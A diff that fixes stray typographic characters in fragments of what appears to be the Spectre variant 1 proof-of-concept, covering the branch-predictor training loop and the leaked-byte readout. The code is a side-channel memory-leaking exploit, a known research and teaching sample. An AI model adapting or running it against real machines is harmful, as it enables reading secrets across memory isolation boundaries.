@@ -59,10 +59,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
              * or malicious_x if j % 6 == 0 */
             /* Avoid jumps in case those tip off the branch predictor */
             /* Set x=FFF.FF0000 if j%6==0, else x=0 */
-            x = ((j % 6) - 1) & ˜0xFFFF;
+            x = ((j % 6) - 1) & ~0xFFFF;
             /* Set x=-1 if j&6=0, else x=0 */
             x = (x | (x >> 16));
-            x = training_x ˆ (x & (malicious_x ˆ training_x));
+            x = training_x ^ (x & (malicious_x ^ training_x));
 
             /* Call the victim! */
             victim_function(x);
@@ -95,7 +95,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2],
             break; /* Success if best is > 2*runner-up + 5 or 2/0) */
     }
     /* use junk to prevent code from being optimized out */
-    results[0] ˆ= junk;
+    results[0] ^= junk;
     value[0] = (uint8_t)j;
     score[0] = results[j];
     value[1] = (uint8_t)k;
@@ -122,7 +122,7 @@ int main(int argc, const char **argv) {
         readMemoryByte(malicious_x++, value, score);
         printf("%s: ", score[0] >= 2 * score[1] ? "Success" : "Unclear");
         printf("0x%02X=’%c’ score=%d ", value[0],
-            (value[0] > 31 && value[0] < 127 ? value[0] : ’?’), score[0]);
+            (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
         if (score[1] > 0)
             printf("(second best: 0x%02X score=%d)", value[1], score[1]);
         printf("\n");
